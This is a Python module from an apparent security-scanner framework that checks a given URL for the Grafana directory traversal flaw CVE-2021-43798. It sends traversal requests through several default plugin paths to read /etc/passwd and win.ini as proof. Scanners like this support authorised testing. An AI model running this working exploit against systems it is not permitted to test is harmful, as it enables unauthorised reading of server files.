import asyncio
from modules.core import console

# Grafana Scanner (LFI)
# Focus: CVE-2021-43798 (Directory Traversal).
# Vector: /public/plugins/<plugin>/../../../../../../../../etc/passwd

# Common plugins that exist by default:
# alertlist, annolist, barchart, dashlist, text, welcome, news, graph...

GRAFANA_PLUGINS = [
    "alertlist",
    "annolist", 
    "barchart",
    "dashlist",
    "text",
    "welcome"
]

async def check_grafana(session, url):
    try:
        # Check for Grafana
        # /login often says "Grafana"
        
        # CVE-2021-43798
        # Try to read /etc/passwd or /etc/grafana/grafana.ini
        
        for plugin in GRAFANA_PLUGINS:
            # Traversal payload
            # /public/plugins/{plugin}/../../../../../../../../etc/passwd
            
            target = f"{url.rstrip('/')}/public/plugins/{plugin}/../../../../../../../../etc/passwd"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                if "root:x:0:0" in text:
                     return {
                        "url": target,
                        "type": "Grafana LFI (CVE-2021-43798)",
                        "evidence": f"/etc/passwd leaked via {plugin} plugin."
                    }
                
            # Check for Windows ini
            target_win = f"{url.rstrip('/')}/public/plugins/{plugin}/../../../../../../../../windows/win.ini"
            async with session.get(target_win, timeout=5, ssl=False) as w_resp:
                if "[extensions]" in await w_resp.text():
                     return {
                        "url": target_win,
                        "type": "Grafana LFI (CVE-2021-43798)",
                        "evidence": f"win.ini leaked via {plugin} plugin."
                    }

    except Exception:
        pass
    return None

async def scan_grafana(session, url):
    """
    Scan for Grafana Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Grafana Scanner ---[/bold cyan]")
    
    results = []
    res = await check_grafana(session, url)
    if res:
         console.print(f"  [bold red][!] GRAFANA VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Grafana LFI vectors found.[/dim]")
        
    return results
